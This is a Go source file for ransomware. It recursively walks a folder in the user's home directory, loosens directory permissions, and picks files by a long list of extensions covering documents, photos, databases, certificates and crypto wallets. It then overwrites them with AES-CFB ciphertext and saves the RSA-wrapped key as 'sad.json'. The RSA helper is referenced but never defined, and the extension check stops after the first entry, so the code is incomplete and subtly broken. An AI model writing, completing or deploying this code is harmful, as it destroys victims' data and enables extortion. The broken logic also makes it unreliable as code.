package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var filesType []string = []string{
	".txt", ".exe", ".php", ".pl", ".7z", ".rar", ".m4a", ".wma",
	".avi", ".wmv", ".csv", ".d3dbsp", ".sc2save", ".sie", ".sum",
	".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6",
	".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl",
	".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb",
	".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame",
	".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob",
	".esm", ".001", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor",
	".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff",
	".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".mp3",
	".upx", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset",
	".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk",
	".rgss3a", ".pak", ".big", ".unity3d", ".wotreplay", ".xxx", ".desc", ".py",
	".m3u", ".flv", ".js", ".css", ".rb", ".png", ".jpeg", ".p7c", ".p7b", ".p12",
	".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d",
	".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc",
	".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".d ng", ".jpeg",
	".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd", ".psd", ".dbfv", ".mdf",
	".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm",
	".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm",
	".docx", ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".sql", ".zip",
	".tar", ".tar.gz", ".tgz", ".biz", ".ocx", ".html", ".htm", ".3gp", ".srt", ".cpp",
	".mid", ".mkv", ".mov", ".asf", ".mpeg", ".vob", ".mpg", ".fla", ".swf", ".wav",
	".qcow2", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk",
	".bak", ".djv", ".djvu", ".bmp", ".cgm", ".tif", ".tiff", ".NEF", ".cmd", ".class",
	".jar", ".java", ".asp", ".brd", ".sch", ".dch", ".dip", ".vbs", ".asm",
	".pas", ".ldf", ".ibd", ".MYI", ".MYD", ".frm", ".dbf", ".SQLITEDB", ".SQLITE3",
	".asc", ".lay6", ".lay", ".ms11(Securitycopy)", ".sldm", ".sldx", ".ppsm",
	".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".slk", ".xlw", ".xlt", ".xlm",
	".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm",
	".DOT", ".max", ".xml", ".uot", ".stw", ".sxw", ".ott", ".csr", ".key",
	"wallet.dat", "pdf"}

type Dirs struct {
	fName    []string
	dirList  []string
	fType    map[string]string
	fContent []byte
}

type fData struct {
	file Dirs
}

func main() {

	fmt.Println("loading, it might take a while ...")
	hdir := UserHomeDir()
	fd := fData{}
	loc := hdir + `\Home`
	filet := fd.Walk(loc)

	key, iv := keyiv()
	secret := struct {
		Key []byte
		Iv  []byte
	}{
		key,
		iv,
	}
	sad, err := json.Marshal(secret)
	if err != nil {
		println(err)
	}

	rsaS := &RSA{hash: sha256.New(), random: rand.Reader, plainText: sad}
	rsaS.importedKey()
	result := rsaS.rsaEncrypt()

	js, err := os.Create("sad.json")
	if err != nil {
		println(err)
	}

	js.Write(result)

	for _, val := range filet {
		plainText, err := readFile(val)
		if err != nil {
			println(err)
		}

		cipherText := Encrypt(plainText, key, iv)
		f, err := os.Create(val)
		if err != nil {
			println(err)
		}

		f.Write(cipherText)

		f.Close()
	}
}

func keyiv() (key []byte, iv []byte) {
	key = make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println(err)
	}

	iv = make([]byte, aes.BlockSize)
	_, err = io.ReadFull(rand.Reader, iv)
	if err != nil {
		fmt.Println(err)
	}

	return key, (iv)

}

func Encrypt(plainText []byte, key []byte, iv []byte) (cipherText []byte) {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(block)
	}

	cfb := cipher.NewCFBEncrypter(block, iv)

	cipherText = make([]byte, len(plainText))
	cfb.XORKeyStream(cipherText, plainText)

	return cipherText
}

func readFile(name string) ([]byte, error) {
	f, err := ioutil.ReadFile(name)
	if err != nil {
		return nil, err
	}

	return f, nil
}

func UserHomeDir() (hpath string) {
	hpath, err := os.UserHomeDir()
	if err != nil {
		err = err
	}
	return hpath
}

func (fd *fData) Walk(path string) (fpath []string) {
	mod, _ := os.Stat(path)
	mo := mod.Mode()
	if mo.String() != "drwxrwxrwx" {
		err := os.Chmod(path, os.ModePerm)
		if err != nil {
			//
		}
	}

	f, err := os.ReadDir(path)
	if err != nil {
		//
	}

	for _, file := range f {
		npath := filepath.Join(path, file.Name())
		if file.IsDir() {
			fd.Walk(npath)
		} else {
			if CheckFileType(npath) {
				fd.file.dirList = append(fd.file.dirList, npath)
			}
		}
	}

	return fd.file.dirList
}

func CheckFileType(file string) bool {
	for _, val := range filesType {
		res := strings.HasSuffix(file, val)
		return res
	}

	return false

}
